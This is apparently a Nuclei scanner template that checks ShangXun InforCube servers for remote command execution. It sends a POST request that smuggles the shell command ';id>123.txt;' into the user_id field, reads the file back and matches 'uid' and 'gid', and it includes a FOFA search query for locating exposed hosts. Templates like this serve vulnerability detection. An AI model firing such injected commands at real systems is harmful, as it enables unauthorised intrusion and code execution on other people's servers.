id: shangXunInforCube-startconfirm-rce

info:
  name: shangXunInforCube-startconfirm-rce
  author: iSee857
  severity: high
  description: shangXunInforCube-startconfirm-rce
  tags: shangxun,rce
  metadata:
    fofa-qeury: body="default/getloginhtml"
    veified: true
    max-request: 2
http:

  - raw:
      - |              
        POST /default/StartConfirm/ HTTP/1.1
        Host: 
        Content-Type: application/x-www-form-urlencoded

        username=1&user_id=;id>123.txt;&google_key_dec=1&safety_code1=1&safety_code2=1
      - |              
        GET /123.txt HTTP/1.1
        Host:  

    matchers:     
      - type: word
        part: body
        words:
          - "uid"
          - "gid"
        condition: and
      - type: status
        status:
          - 200